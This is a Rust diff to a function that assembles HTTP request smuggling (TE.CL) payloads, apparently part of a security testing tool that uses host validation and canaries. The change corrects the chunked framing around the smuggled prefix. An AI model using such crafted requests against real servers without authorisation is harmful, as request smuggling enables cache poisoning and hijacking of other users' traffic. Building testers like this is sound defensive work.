@@ -158,26 +158,27 @@ pub fn te_cl(
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let smuggled = ensure_crlf(&prefix);
-    let chunk_data = format!(
-        "{:x}\r\n{}\r\n0\r\n\r\n",
-        smuggled.len(),
-        smuggled.trim_end_matches("\r\n")
-    );
+    let smuggled_bytes = smuggled.as_bytes();
+    // Chunked framing per RFC: chunk-size CRLF, chunk-data (exactly N octets), CRLF, …, 0 CRLF CRLF.
+    let chunk_size_line = format!("{:x}\r\n", smuggled_bytes.len());
     // CL covers just the first chunk-size line (e.g., "5\r\n" => 3 bytes for single-digit)
-    let chunk_size_line = format!("{:x}\r\n", smuggled.len());
     let content_length = chunk_size_line.len();
-    let raw = format!(
+    let mut raw = format!(
         "POST / HTTP/1.1\r\n\
          Host: {host}\r\n\
          Content-Length: {content_length}\r\n\
          Transfer-Encoding: chunked\r\n\
-         \r\n\
-         {chunk_data}"
-    );
+         \r\n"
+    )
+    .into_bytes();
+    raw.extend_from_slice(chunk_size_line.as_bytes());
+    raw.extend_from_slice(smuggled_bytes);
+    raw.extend_from_slice(b"\r\n");
+    raw.extend_from_slice(b"0\r\n\r\n");
     Ok(SmugglingPayload {
         description: format!("TE.CL CL={content_length}"),
         variant: SmugglingVariant::TeCl,
-        raw_bytes: raw.into_bytes(),
+        raw_bytes: raw,
         canary: Canary::generate(),
     })
 }
